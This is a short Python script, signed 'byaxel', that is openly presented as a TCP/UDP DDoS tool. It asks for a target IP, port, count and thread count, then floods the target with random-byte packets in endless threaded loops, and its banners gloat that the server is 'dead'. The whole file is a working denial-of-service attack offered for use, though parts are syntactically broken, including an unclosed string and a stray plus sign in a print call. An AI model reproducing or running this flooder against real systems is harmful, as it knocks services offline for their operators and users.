#byaxel
import random 
import socket
import threading#1F00C3
import os , sys

os.system("clear") 
print ('''\033[96m AXELOREZ
print("\033[96m#=======TCP UDP DDOS TOOLS============#                          \033[96m")
print("\033[96m$=======AJARIN AKU JADI HENGKEL=======$                          \033[96m")
print("\033[96m+=======Tools Codes By : Axel======+                          \033[96m")

choice = str(input("\033[92m UDP/TCP: \033[92m"))
ip = str(input("\033[92m HOST/IP TARGET: \033[92m"))
port = int(input("\033[92m PORT TARGET : \033[92m"))
times = int(input("\033[92m TIMES : \033[92m"))
threads = int(input("\033[92m THREADS : \033[92m"))
os.system("clear")
def udp():
	data = random._urandom(1402)
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(+"\033[91m AxeLOREZ Attacking Ip %s \\033[91m And Port %s"%(ip,port))
		except:
			print("\033[91m MAMPUS Server %s Has Been Maintenance %s"%(ip,port))
def tcp():
	data = random._urandom(3016)
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
		except:
			s.close()
			print("\033[91m  AxeLOR Attacking Ip %s And Port %s"%(ip,port))

for y in range(threads):
    if choice == 'UDP':
        th = threading.Thread(target = udp)
        th.start()
    elif choice == 'TCP':
        th = threading.Thread(target = tcp)
        th.start()